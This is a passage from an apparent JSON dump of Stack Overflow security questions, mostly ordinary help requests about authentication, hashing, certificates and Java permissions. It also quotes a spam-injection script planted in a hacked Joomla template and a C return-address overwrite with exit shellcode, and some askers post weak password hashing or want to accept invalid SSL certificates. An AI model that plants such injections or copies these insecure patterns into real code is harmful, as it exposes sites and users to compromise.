anonymous: ~\n</code></pre>\n"},{"tags":["java","security","certificate","digital-certificate","pkcs#11"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":128,"score":0,"question_id":10461540,"title":"VASCO Digital Certificate","body":"<p>How to read vasco digital certificate. </p>\n\n<p>I am using in config file following</p>\n\n<pre><code>name=\"VASCO DP CertiID PKCS#11 V2.20\"\nlibrary=\"C:\\Program Files\\VASCO\\DIGIPASS CertiID\\VdsPKCS1132.dll\"\n</code></pre>\n\n<p>I am getting this error:</p>\n\n<pre><code>java.security.KeyStoreException: KeyStore instantiation failed\n    at java.security.KeyStore$Builder$2.getKeyStore(Unknown Source)\n    at eTokenApplet.initializeCard(eTokenApplet.java:417)\n    at eTokenApplet.getCertificates(eTokenApplet.java:1952)\n    at sun.reflect.GeneratedMethodAccessor5.invoke(Unknown Source)\n    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)\n    at java.lang.reflect.Method.invoke(Unknown Source)\n    at sun.plugin.javascript.JSInvoke.invoke(Unknown Source)\n    at sun.reflect.GeneratedMethodAccessor3.invoke(Unknown Source)\n    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)\n    at java.lang.reflect.Method.invoke(Unknown Source)\n    at sun.plugin.javascript.JSClassLoader.invoke(Unknown Source)\n    at sun.plugin2.liveconnect.JavaClass$MethodInfo.invoke(Unknown Source)\n    at sun.plugin2.liveconnect.JavaClass$MemberBundle.invoke(Unknown Source)\n    at sun.plugin2.liveconnect.JavaClass.invoke0(Unknown Source)\n    at sun.plugin2.liveconnect.JavaClass.invoke(Unknown Source)\n    at sun.plugin2.main.client.LiveConnectSupport$PerAppletInfo$DefaultInvocationDelegate.invoke(Unknown Source)\n    at sun.plugin2.main.client.LiveConnectSupport$PerAppletInfo$3.run(Unknown Source)\n    at java.security.AccessController.doPrivileged(Native Method)\n    at sun.plugin2.main.client.LiveConnectSupport$PerAppletInfo.doObjectOp(Unknown Source)\n    at sun.plugin2.main.client.LiveConnectSupport$PerAppletInfo$LiveConnectWorker.run(Unknown Source)\n    at java.lang.Thread.run(Unknown Source)\nCaused by: java.security.KeyStoreException: PKCS11 not found\n    at java.security.KeyStore.getInstance(Unknown Source)\n    at java.security.KeyStore$Builder$2$1.run(Unknown Source)\n    at java.security.AccessController.doPrivileged(Native Method)\n    ... 21 more\nCaused by: java.security.NoSuchAlgorithmException: no such algorithm: PKCS11 for provider SunPKCS11-VASCO DP CertiID PKCS#11 V2.20\n    at sun.security.jca.GetInstance.getService(Unknown Source)\n    at sun.security.jca.GetInstance.getInstance(Unknown Source)\n    at java.security.Security.getImpl(Unknown Source)\n</code></pre>\n"},{"tags":["asp.net","security","reporting-services"],"answer_count":3,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":1935,"score":4,"question_id":538894,"title":"SSRS 2005 - Configuring User Authentication/Authorization","body":"<p>I have created an ASP.NET 2.0 web application and would like to use SSRS 2005 for reporting purposes.</p>\n\n<p>The web application uses forms authentication and custom roles for authorization. I have created reports and deployed it to a our SQL Server 2005 box.</p>\n\n<p>I have two options to integrate the reports into my application:</p>\n\n<p>1) Link to SSRS from within my application. The link would have the parameters and options specified. I make sure that the link only shows for authorized users and it links to correct report with appropriate parameters.</p>\n\n<p>2) Use ReportViewer control and display reports using that. All processing will be done by SSRS</p>\n\n<p>However, I am not sure of the best way to configure security in the IIS on the Reporting Services box. Currently it is set to Windows Integrated Authentication. Also the reporting service has my username with Browser role.</p>\n\n<p>Not all users of my application will have AD login. Also the application is on internet and I don't want to open up SSRS more than necessary. At the same time, I want it to be seamless for our users in that I don't want SSRS to prompt for username and password.</p>\n\n<p>What is the best way to accomplish this? Should I create a dummy AD user and then use it to communicate between ASP.NET app and SSRS? Or if not that, what is the easiest way that achieves everything I need?</p>\n"},{"tags":[".net","wpf","security","mvvm","securestring"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12973832,"title":"Protecting sensitive PII data in a WPF Textbox","body":"<p>I'm looking for some guidance on using securestring with a regular WPF textbox.  The application has several different Personally Identifiable Information (PII) fields that are entered, displayed and compared throughout the application.   I've reviewed a number of posts regarding securestring use with the PasswordBox control, but the password box isn't applicable to this situation because the values need to be displayed and updated by the user.</p>\n\n<p>My main point of uncertainty is around using the textbox.text property.  It seems that simply converting the text property to/from a securestring for use in the viewmodel and model would still leave the value of the text property in memory as a string.  If the app needs to display this data is that just the best that can be done?  Or, is there some further means of protecting this data?</p>\n"},{"tags":["asp.net","security",".aspxauth"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12973277,"title":".ASPXAuth Cookie changes during session","body":"<p>Is there any reason why, in the middle of an authenticated session, the .ASPXAUTH cookie would change its value?</p>\n\n<p>It doesn't seem that ASP.Net_SessionId has changed its value at the same point (and the session hasn't expired).</p>\n\n<p>Are there some rules that dictate that the .ASPXAUTH cookie value is updated periodically or for any other reason?</p>\n\n<p>Issue is that we're cross checking the values of these cookies that they don't change during a session as a protection against xss or session hijacking.</p>\n"},{"tags":["c#","database","security","dll","connection"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":79,"score":3,"question_id":12973229,"title":"C# Database Connection Stored in DLL to Call","body":"<p>I am New to the more enhanced features of the C# and .NET coding practices</p>\n\n<p>I have been trying to Find A solution to using a particular method in C# for Winforms, Windows Services And ASP.NET web Applications where you program your connection to SQL and Convert the C# Code file to a dll to be used in your project. </p>\n\n<p>The idea is to Create the Connection and Convert it to a dll so that every time you start a function and need to make a database connection you will just write it where you say</p>\n\n<pre><code>Function ABC\n{\n    //VB Version would be like this as i have seen this\n    Dim DCDLL as New Dataconn \n\n    //Where 'DCDLL' is the DLL file which is being declared as a new dataconnection\n\n    //C# Version would be Alon these Lines\n    SQLConnection DataConn = New SQLConnection(DCDLL)\n}\n</code></pre>\n\n<p>I have only seen the VB Code version of the Call so I am not keen on the C# Method that this would be done</p>\n\n<p>Meanwhile The DLL Holds all the other code like</p>\n\n<pre><code>string ConnectionString = \n                    \"Data Source=Datasource; UID=User; PWD=Pass; Persist Security\n                     Info=True; Initial Catalog= Catalog\";\nDataconn = new SqlConnection(ConnectionString);\nDataconn.Open();\n</code></pre>\n\n<p>the purpose of the DLL would be to handle the connection to the database, Open it catch errors if dataconnection is not successfull and close the connection if needed so that you dont have to programatically do this every time. Also it is only responsible for the connection therefore you can use a function to call the connection execute the procedure and whatever else is required. </p>\n\n<p>The idea of using a DLL is just to make the Connection settings to the Database a little more secure, the Connection obviously wont become super secure but it adds more security than having the Code in you code pages etc.</p>\n\n<p>i have spoken to and seen people use this type of method but my research on how to achieve this via google and other sources does not seem to understand what i am searching for.</p>\n\n<p>I am trying to understand that when i code this file how it must be done as to ensure that it handles the database connection correctly without issues and doesnt break.</p>\n\n<p>If anyone can Give me Examples in C# of how to do this it would be appreciated or if you know of any pages that have explained how to achieve this i would be most grateful for your assistance</p>\n"},{"tags":["php","sql","security","sql-injection","web-security"],"answer_count":4,"favorite_count":6,"up_vote_count":14,"down_vote_count":0,"view_count":7360,"score":14,"question_id":860954,"title":"Examples of SQL Injections through addslashes()?","body":"<p>In PHP, I know that mysql_real_escape in much safer than using addslashes.\nHowever, I could not find an example of a situation where addslashes would let an SQL Injection happen.\nCan anyone give some examples?</p>\n\n<p>Thanks!</p>\n"},{"tags":["ios","security","in-app-purchase"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12970678,"title":"IAP receipt validation \"Fallback\" check","body":"<p>I am implementing a receipt validation with my server in my App. 98% of the time the server response well but sometimes I have a server error that it is not connected to the receipt validation process. </p>\n\n<p>An other problem is when I get a duplicate receipt warning which can sometimes accrue when a user stops the app before the transaction is finished and the app resubmits the same receipt.</p>\n\n<p>What I thought is to make a check fallback to apple severs with the Apple VerificationController. </p>\n\n<p>Somthing like that -</p>\n\n<ol>\n<li>If my server returns a valid or invalid -> supply the content or return an error.</li>\n<li>If I get a server error or a duplicate receipt -> make an other check directly to apple servers.</li>\n<li>If it is invalid return an error, If it is valid supply the content assuming that I will reduce a little bit of my security.</li>\n</ol>\n\n<p>Since I am not a security expert I wish to know if there are any drawbacks to this approach ?</p>\n\n<p>Thanks </p>\n\n<p>Shani</p>\n"},{"tags":["ruby-on-rails","security","activerecord","sql-injection"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12970441,"title":"Rails sql injection in custom \"where\" clause","body":"<p>I'm building a custom where clause for a model, and I wanted to know if the way I'm doing it is a secure way against sql injection attacks.\nThis is my method:</p>\n\n<pre><code>def self.search(search)\n  if search\n    conditions = []\n    conditions &lt;&lt; [ 'name like ?', search[:name] ] unless search[:name].blank?\n    conditions &lt;&lt; [ 'product_type_id = ?', search[:product_type_id] ] unless search[:product_type_id].blank?\n\n    conditions = ( conditions.empty? ? nil : [conditions.transpose.first.join(' and '), *conditions.transpose.last] )\n    where(conditions)\n  else\n    scoped\n  end\nend\n</code></pre>\n\n<p>What do yo think?\nThanks in advance!</p>\n"},{"tags":["html","security","http"],"answer_count":23,"favorite_count":63,"up_vote_count":93,"down_vote_count":1,"view_count":28995,"score":92,"question_id":198462,"title":"Is either GET or POST more secure than the other?","body":"<p>When comparing an HTTP GET to an HTTP POST, what are the differences from a security perspective? Is one of the choices inherently more secure than the other? If so, why?</p>\n\n<p>I realize that POST doesn't expose information on the URL, but is there any real value in that or is it just security through obscurity? Is there ever a reason that I should prefer POST when security is a concern?</p>\n\n<p><strong>Edit:</strong><br>\nOver HTTPS, POST data is encoded, but could URLs be sniffed by a 3rd party? Additionally, I am dealing with JSP; when using JSP or a similar framework, would it be fair to say the best practice is to avoid placing sensitive data in the POST or GET altogether and using server side code to handle sensitive information instead?</p>\n"},{"tags":["c#","asp.net","security","session"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12969213,"title":"Does storing the username in the session['user'] safe? c# asp.net","body":"<p>I have the following code in my web application asp.net using C#:</p>\n\n<pre><code>            bool isValid = pc.ValidateCredentials(username.Text, password.Text);\n            if (isValid == true)\n            {\n                Session[\"user\"] = username.Text;\n            }\n</code></pre>\n\n<p>The <code>username</code> is actually a textbox. The end-user will key in their username and password, which will authenticate against a AD (Active Directory) server using the <code>PrincipalContext pc</code>.</p>\n\n<p>So, I was wondering if it is safe or are there improvement to be make for the above code so that it can be more secure?</p>\n"},{"tags":["java","security","applet","rdp","accesscontrolexception"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12969137,"title":"Try to access command prompt through applet in HTML","body":"<p>I have required to take remote desktop connection through browser for which I have written an signed applet and try to call through HTML but I am getting:</p>\n\n<pre><code>java.security.AccessControlException: access denied (java.io.FilePermission &lt;&lt;ALL FILES&gt;&gt; execute)\nat java.security.AccessControlContext.checkPermission(AccessControlContext.java:374)\nat java.security.AccessController.checkPermission(AccessController.java:546)\nat java.lang.SecurityManager.checkPermission(SecurityManager.java:532)\nat java.lang.SecurityManager.checkExec(SecurityManager.java:782)\nat java.lang.ProcessBuilder.start(ProcessBuilder.java:448)\nat java.lang.Runtime.exec(Runtime.java:593)\nat java.lang.Runtime.exec(Runtime.java:466)\nat AppletProgram.init(AppletProgram.java:11)\nat sun.applet.AppletPanel.run(AppletPanel.java:424)\nat java.lang.Thread.run(Thread.java:662)\n</code></pre>\n\n<p>I have added all the permission in the java.policy file but still not able to resolve the same error. How to resolve the problem? </p>\n"},{"tags":["android","security","camera","cameracapturetask"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12968505,"title":"Android camera auto click capture...!","body":"<p>I am going to develop android camera application. In app. when user click search button, two synchronously task going to woke one is searching text which is enter by user and other is camera functionality. In this camera functionality, camera auto capture user image, and I don't want to show any camera activity to user, it's all manage from the programming level, when camera start and capture image of user at a time user show searching result or working on that searching task, how can i do..? please vote.. thanks for replying me...!</p>\n"},{"tags":["java","security","sockets"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":378,"score":1,"question_id":7326086,"title":"java socket permission problem","body":"<p>I have a need to write to a remote machine via a Socket from within an applet.   The applet resides within an intranet within a closed hospital system so changing the java security file is not an issue.    From the Oracle site, they recommend the following policy change:</p>\n\n<p>grant {\n  permission java.net.SocketPermission \n  \"10.130.71.156:8000\", \"connect,accept\";\n};</p>\n\n<p>I have done this but I am still getting the following error:</p>\n\n<pre><code>java.security.AccessControlException: access denied (java.net.SocketPermission [10.130.71.156:8000]resolve)     \n</code></pre>\n\n<p>Any ideas of what the problem could be?</p>\n"},{"tags":[".net","security","encryption","hash"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1968,"score":1,"question_id":242648,"title":"What is the most secure hashing algorithm in the .NET framework?","body":"<p>The size of the generated hash and the speed of the algorithm are not important. I'm really only interested in it being the most secure option. I don't want to use any third party libraries either.</p>\n\n<p>The version of the .NET framework I'm using if 3.5 if that makes any difference.</p>\n"},{"tags":[".net","security","hash","passwords"],"answer_count":4,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":281,"score":4,"question_id":2121913,"title":"Is there a built in function to hash passwords in .NET?","body":"<p>I seen this question <a href=\"http://stackoverflow.com/questions/287517/encrypting-hashing-plain-text-passwords-in-database\">http://stackoverflow.com/questions/287517/encrypting-hashing-plain-text-passwords-in-database</a></p>\n\n<p>and i am aware i shouldnt do md5(\"salt\" + password); and i see an implementation in python for a solution.</p>\n\n<p>Is there a .NET built in function with params i can use instead of writing my own?</p>\n"},{"tags":["web-services","security","rest","pkcs7"],"answer_count":0,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":91,"score":5,"question_id":12966460,"title":"REST APIs and message level security","body":"<p>I need to implement message level security in a REST API and have some concerns and questions. I found the answer here: \n<a href=\"http://stackoverflow.com/questions/9869828/message-level-security-in-rest-web-services\">Message Level Security in Rest Web services</a></p>\n\n<p>only partially helpful. </p>\n\n<p>We currently support standard SSL transport security and several authentication methods including:</p>\n\n<ul>\n<li>Basic http auth (required by some network equipment services that\ntalk to our API's)</li>\n<li>HMAC with pre-shared secrete key in both SHA1 and    SHA256 flavors.</li>\n<li>Client identity certs sent @ the TLS level. </li>\n<li>SAML 2.0</li>\n</ul>\n\n<p>Why we need message level security because:</p>\n\n<ul>\n<li>Customer industries include health care, financial and government, among others, and they often frown on SSL only.</li>\n<li>Need to guarantee end to end security. Through reverse proxies, SSL accelerators, etc... </li>\n<li>Some data passed through the services will include very sensitive data. </li>\n<li>Need to have a good answer for customers that insist that SOAP's WS-* security standards are  \"Enterprise strength\" web services and REST APIs are not.</li>\n</ul>\n\n<p>My initial thought is to use an PKCS#7 envelope, as an option, if client applications understand how to process enveloped responses. </p>\n\n<p>I want client applications to tell the API that they want a secured response or tell the API that the message they are POSTing or PUTing is secured.</p>\n\n<p>My real question is, should this be communicated through a media type? E.g.:</p>\n\n<ul>\n<li>Content-Type: application/vnd.resourcetype1+json+pkcs7</li>\n<li>Content-Type: txt/csv+pkcs7</li>\n</ul>\n\n<p>i don't want to loose information on the media type that is enveloped. </p>\n\n<p>It gets complicated as in some cases the signature is enough. Others require encryption as well. The term \"pkcs7\" is vague as to how the envelope is constructed. </p>\n\n<p>I want the client and server to tell each other the type of content they are sending and the type of content they understand through standard HTTP headers.</p>\n"},{"tags":["php","mysql","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":66,"score":1,"question_id":12830283,"title":"MD5 + Salt giving me some strange characters","body":"<pre><code>$salt = uniqid();\n   $crypt = md5($password , $salt);\n   $new_pass = $crypt.':'.$salt;\n</code></pre>\n\n<p>In the database: <code>ot[%:17b8bc731c322c9e05a26666458117f4</code></p>\n\n<p>Is this a syntactical error? Or is the database not set up with the correct character formatting?</p>\n"},{"tags":["java","security","rsa","cipher"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":82,"score":2,"question_id":12914814,"title":"Java security class cast exception","body":"<p>Hi I am beginner in Java security, i encounter the following issue, when calling :</p>\n\n<pre><code>Cipher cipher = Cipher.getInstance(\"RSA/ECB/PKCS1Padding\");\n</code></pre>\n\n<p>I got the error :</p>\n\n<p><code>java.lang.ClassCastException: com.sun.crypto.provider.RSACipher cannot be cast to javax.crypto.CipherSpi</code></p>\n\n<p>There are 5 more jars file for a payment gateway encryption in my war file:</p>\n\n<ul>\n<li>cryptix-jce-api.jar</li>\n<li>cryptix-jce-provider.jar</li>\n<li>cryptix-message-api.jar</li>\n<li>cryptix-openpgp-provider.jar</li>\n<li>cryptix-pki-api.jar</li>\n</ul>\n\n<p>Without these 5 JAR files then the <strong>Cipher.getInstance()</strong> works, but that is not possible because I need the JARs for payment information encryption.</p>\n\n<p>Anyone out there can show me the path of how should I overcome this issue?</p>\n"},{"tags":["php","security","joomla"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12952449,"title":"Joomla 1.5 files security problems","body":"<p>I'm hosting with 1and1 UK a Joomla 1.5.26 website. This week we've been getting hacked and I do not know how to tackle the problem. </p>\n\n<p>1and1 are COMPLETELY USELESS, answering a question like this \"How did index.php change from 644 to 200 permissions\" with this answer \"to change the file permissions, follow these steps\".. </p>\n\n<p>Anyways, the questions I'm looking to have answered is:</p>\n\n<p>What is the correct file/folder permissions setting? Is it: Folders 755 and Files 644?</p>\n\n<p>Is there a component or another way in which to \"search all files and folders and RESET the correct permissions\"?</p>\n\n<p>Is there a component or another way in which I can install additional security for both the files/folders, but also the database, to prevent these kinds of attacks?</p>\n\n<p>Many thanks for your time</p>\n"},{"tags":["php","security","hash","login","passwords"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":12964054,"title":"PHP: Password hash using various methods","body":"<p>I was looking for the best way to store the users' passwords, but I'm not really into security, so I've found a lot of information about encryption and things like that, using Google.</p>\n\n<p>I don't like using snippets that I can get in blogs or sites on the Internet, I'd rather create my own solution, so I ended up developing two functions: One to create a hash and another one to check the \"hashed\" password.</p>\n\n<p>I don't know if I'm doing right, or if I'm just increasing my problems, so take a look at the functions below. </p>\n\n<pre><code>// Creates a simple password's hash\nfunction hashPassword( $password = false )\n{\n  // Checks if the password has more than 6 characters\n  if( strlen( $password ) &lt; 6 )\n  {\n    // Kills the script\n    exit('Password is too short.');\n   }\n\n   // Split the 4 first characters of the password\n   $salt = substr( $password, 0, 4 );\n\n   // Calculate the md5 hash of the salt\n   $salt = md5( $salt );\n\n   // Get the rest of the password\n   $password =  substr( $password, 3, strlen( $password ) );\n\n   // Calculate the md5 hash of the password\n   $password = sha1( $salt . $password );\n\n   // Crypt the password\n   $password = crypt( $password );\n\n   return $password;\n}\n</code></pre>\n\n<p>That's the password that I'm going to store. Now, check out the way I'm gonna check if the password's correct.</p>\n\n<pre><code>// Checks if a hashed password match a user input password\nfunction checkHashedPassword( $password = false, $hashedPassword = false )\n{\n// Checks if the password has more than 6 characters\nif( strlen( $password ) &lt; 6 )\n{\n    // Kills the script\n    exit('Password is too short.');\n}\n\n// Split the 4 first characters of the password\n$salt = substr( $password, 0, 4 );\n\n// Calculate the md5 hash of the salt\n$salt = md5( $salt );\n\n// Get the rest of the password\n$password =  substr( $password, 3, strlen( $password ) );\n\n// Calculate the md5 hash of the password\n$password = sha1( $salt . $password );\n\n// Checks the password and hash\nif( crypt( $password, $hashedPassword ) == $hashedPassword ) \n{\n    // Returns true\n    return true;\n}\n\n// Returns false by default\nreturn false;\n}\n</code></pre>\n\n<p>As you can notice, I'm going to create a variable storing the password, and the I can check if it's ok, like the code below:</p>\n\n<pre><code>$pass = hashPassword( $_POST['password'] );\n\nif( !checkHashedPassword( $_POST['password'], $pass ) ) \n{\n    exit('Password incorrect!');\n}\n</code></pre>\n\n<p>So, will it work securely?</p>\n"},{"tags":["ios","security","restkit","finance"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12965564,"title":"Is RestKit a suitable framework for financial apps?","body":"<p>Is RestKit suitable for financial apps on iOS?</p>\n\n<p>The financial app will assist people to manage their money between accounts. It will be supporting both XML and JSON payloads.</p>\n\n<p>Will it stand up to the rigours of pen-testing?</p>\n"},{"tags":["security","ssl","heroku"],"answer_count":5,"favorite_count":1,"up_vote_count":5,"down_vote_count":6,"view_count":3064,"score":-1,"question_id":1157563,"title":"Why would anyone use Heroku (security-related)?","body":"<p>Heroku seems great, but most non-trivial applications require authentication, and conventional authentication schemes require an SSL connection, and it's impossible to get <code>https://your_app_name.com</code> (you can only get <code>https://your_app_name.heroku.com</code>).</p>\n\n<p>So if you're using Heroku, is it that:</p>\n\n<ol>\n<li>You don't mind directing users to\nanother domain (seems pretty\nbad)</li>\n<li>You don't mind foregoing\nSSL for authentication (seems really\nbad)</li>\n<li>Your app doesn't require authentication</li>\n</ol>\n\n<p><strong>Edit:</strong> In your answer, please select one of the above options.</p>\n"},{"tags":["ios","security","ssl","air","man-in-the-middle"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":12963649,"title":"Air for iOS avoiding Man in the Middle attacks","body":"<p>In Air for iOS, I'm trying to find a way to mark when a possible Man in the Middle attack has occurred.  </p>\n\n<p>By default, anytime you try to connect to an SSL site that has an invalid certificate, you get the error:</p>\n\n<blockquote>\n  <p>\"A secure connection with this site cannot be verified. Would you\n  still like to proceed?</p>\n  \n  <p>The certificate you are viewing does not match the name of the site\n  you are trying to view.\"</p>\n</blockquote>\n\n<p>I don't want to display this prompt, just disable network functions after that.</p>\n\n<p>I started off trying to use a network monitor, but it gives the prompt as does running a separate URL request to test the connection.</p>\n\n<p>I finally came across the \"SecureSocketMonitor\" which seems to do what I need it to do when running through the Flash environment, but once I compile into an Air for iOS application, it doesn't seem to function at all.</p>\n\n<p>Does anyone know how I can detect an invalid SSL certificate without displaying that prompt?</p>\n"},{"tags":["c#","java","security"],"answer_count":0,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":76,"score":2,"question_id":12963497,"title":"Is there a performance issue with SecureRandom, and if so, what can I replace it with?","body":"<p>I want to convert the following Java code to C# but I as far as I remember there were a performance problem on SecureRandom so if you have any suggestion in any kind like changing the way to get Public keys or the whole algorithm, it's appreciated !!!</p>\n\n<pre><code>public KeyPair generateKeys(String path, String username, String keyAlgorithm, int numBits){\n\n    try{\n        if (path == null)\n            return null;\n        if (!path.equals(\"./\")){\n            if (!(new File(path).exists())){\n                boolean success = (new File(path)).mkdirs();\n                if (!success)\n                    return null;\n            }\n        }\n\n\n        KeyPair keyPair = null;\n\n        // Get the public/private key pair\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(keyAlgorithm);\n        SecureRandom random = SecureRandom.getInstance(\"SHA1PRNG\");\n        keyGen.initialize(numBits, random);\n        keyPair = keyGen.genKeyPair();\n        PrivateKey privateKey = keyPair.getPrivate();\n        PublicKey  publicKey  = keyPair.getPublic();\n        if (DEBUG){\n            System.out.println(\"DEBUG: line 77 of KeyPairUtil.java. Generating key/value pair using \" + privateKey.getAlgorithm() + \" algorithm\");\n        }\n\n        // Get the bytes of the public and private keys\n        byte[] privateKeyBytes = privateKey.getEncoded();\n        byte[] publicKeyBytes  = publicKey.getEncoded();\n\n        String privateKeyStr = new sun.misc.BASE64Encoder().encode(privateKeyBytes);\n        String publicKeyStr = new sun.misc.BASE64Encoder().encode(publicKeyBytes);\n\n\n        // Store the public and private keys in separate files\n\n        FileOutputStream pubKeyFile = new FileOutputStream(path + username + \".pub\");\n        pubKeyFile.write(publicKeyStr.getBytes(\"UTF-8\"));\n        pubKeyFile.close();\n\n        FileOutputStream priKeyFile = new FileOutputStream(path + username + \".pri\");\n        priKeyFile.write(privateKeyStr.getBytes(\"UTF-8\"));\n        pubKeyFile.close();\n\n        return keyPair;\n    }catch(NoSuchAlgorithmException e){\n        if (DEBUG){\n            e.printStackTrace();\n        }\n    }catch(FileNotFoundException e){\n        if (DEBUG){\n            e.printStackTrace();\n        }\n    }catch(IOException e){\n        if (DEBUG){\n            e.printStackTrace();\n        }\n    }\n    return null;\n}\n</code></pre>\n"},{"tags":["c#","security","microsoft-metro","web-security","winrt"],"answer_count":1,"favorite_count":3,"up_vote_count":5,"down_vote_count":1,"view_count":315,"score":4,"question_id":11955590,"title":"Accepting invalid SSL certificates using WinRT","body":"<p>There are scenarios where you want your application to accept invalid SSL certificates (testing environment/ self signed certificates etc).</p>\n\n<p>In the .NET world one would use the <code>ServerCertificateValidationCallback</code> class to do so. Unfortunately the class doesn't exist in a WinRT context.</p>\n\n<p>I need to consume a Web API using WinRT which is hosted on a server without a valid ssl certificate. </p>\n\n<p>How do you accept invalid ssl certificates in WinRT using the <code>HttpClient</code> class or any other appropriate class.</p>\n\n<p>Any help or alternatives would much appreciated.</p>\n"},{"tags":["php","security","disabled-input"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12960235,"title":"How to block some php variable from being used","body":"<p>Team i work with keep using <code>$_REQUEST</code> variable when i told them many times to not use it and instead use <code>$_POST</code> and <code>$_GET</code>. i wonder if there is way to block this variable so if they use it again code gives fatal error. Or perhaps deprecate it somehow.</p>\n\n<p>e.g. i can put <code>unset($_REQUEST);</code> in the top of my includes file but i bet they can find it and disable, i need to be able to do it on server side.</p>\n"},{"tags":["c","security","stackoverflow","buffer-overflow","shellcode"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":358,"score":2,"question_id":8488240,"title":"Execution of function pointer to Shellcode","body":"<p>I'm trying to execute this simple opcode for exit(0) call by overwriting the return address of main.\nThe problem is I'm getting segmentation fault.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nchar shellcode[]= \"/0xbb/0x14/0x00/0x00/0x00\"\n                  \"/0xb8/0x01/0x00/0x00/0x00\"\n                  \"/0xcd/0x80\";\n\nvoid main()\n{\n      int *ret;\n\n      ret = (int *)&amp;ret + 2; // +2 to get to the return address on the stack\n\n      (*ret) = (int)shellcode;   \n\n}\n</code></pre>\n\n<p>Execution result in Segmentation error.</p>\n\n<pre><code>[user1@fedo BOF]$ gcc -o ExitShellCode ExitShellCode.c\n\n[user1@fedo BOF]$ ./ExitShellCode\n\nSegmentation fault (core dumped)\n</code></pre>\n\n<p>This is the Objdump of the shellcode.a</p>\n\n<pre><code>[user1@fedo BOF]$ objdump -d exitShellcodeaAss\n\nexitShellcodeaAss:     file format elf32-i386\n\n\nDisassembly of section .text:\n\n08048054 &lt;_start&gt;:\n 8048054:       bb 14 00 00 00          mov    $0x14,%ebx\n 8048059:       b8 01 00 00 00          mov    $0x1,%eax\n 804805e:       cd 80                   int    $0x80\n</code></pre>\n\n<p>System I'm using</p>\n\n<pre><code>fedora Linux 3.1.2-1.fc16.i686 \nASLR is disabled.\nDebugging with GDB.\ngcc version 4.6.2\n</code></pre>\n"},{"tags":["security","encryption","aes"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":326,"score":0,"question_id":4874454,"title":"Tips on encryption for storage at rest (AES, SHA??)","body":"<p>I wanted to know what is the best way to encrypt storage at rest.  Lets say financial information for 1000 users is on a system.  Besides making sure nobody unauthorized gets to how do we encrypt the data that is being used everyday so that if god forbid they get it, it should be impossible for them to decode or read?  </p>\n\n<p>I believe AES is a correct measure?? How can i implement AES using PHP for phpmyadmin data?</p>\n"},{"tags":["security","joomla"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":151,"score":2,"question_id":12960852,"title":"Joomla hacked. How to prevent?","body":"<p>Ok, so one of my websites ( on joomla) is being hacked like, 6th time...</p>\n\n<p>Honestly, i can't take it anymore...\nI feel the stupidest man in the world. I don't know what to do...</p>\n\n<p>Ok, i won't tell you any stories. Only facts:</p>\n\n<p>Firstly i found, that in template index file appeared some code:</p>\n\n<pre><code>&lt;div id='hideMe'&gt; &lt;p&gt;Every person knows the large quan...|...ur cure Viagra &lt;a href=\"xxxxx\"&gt;Viagra&lt;/a&gt; &lt;/div&gt;&lt;script type='text/javascript'&gt;if(document.getElementById('hideMe') != null){document.getElementById('hideMe').style.visibility = 'hidden';document.getElementById('hideMe').style.display = 'none';}&lt;/script&gt;\n</code></pre>\n\n<p>Then i found in tmp folder file named asd.php</p>\n\n<p>with content:\n<a href=\"http://www.codr.cc/bb027a\" rel=\"nofollow\">http://www.codr.cc/bb027a</a></p>\n\n<p>i tried to decode what was in there and got something like:\n<a href=\"http://www.codr.cc/97c183\" rel=\"nofollow\">http://www.codr.cc/97c183</a></p>\n\n<p>How this happened? How hacker got access to create a file? All folders perms are 755 and files - 644.</p>\n\n<p>Joomla doesn't have any unsafe modules, components or templates. \nEverything is up to date.</p>\n\n<p>What else should i do to stop this man from playing with me...</p>\n"},{"tags":["security","oauth-2.0"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12957775,"title":"What's \"Code substitution (OAuth Login)\" threat?","body":"<p>From the <a href=\"http://tools.ietf.org/html/draft-ietf-oauth-v2-threatmodel-08#section-4.4.1.13\" rel=\"nofollow\"><strong>OAuth 2.0 Threat Model and Security Considerations</strong> draft</a>:</p>\n\n<blockquote>\n  <p><strong>4.4.1.13.  Threat: Code substitution (OAuth Login)</strong></p>\n  \n  <p>An attacker could 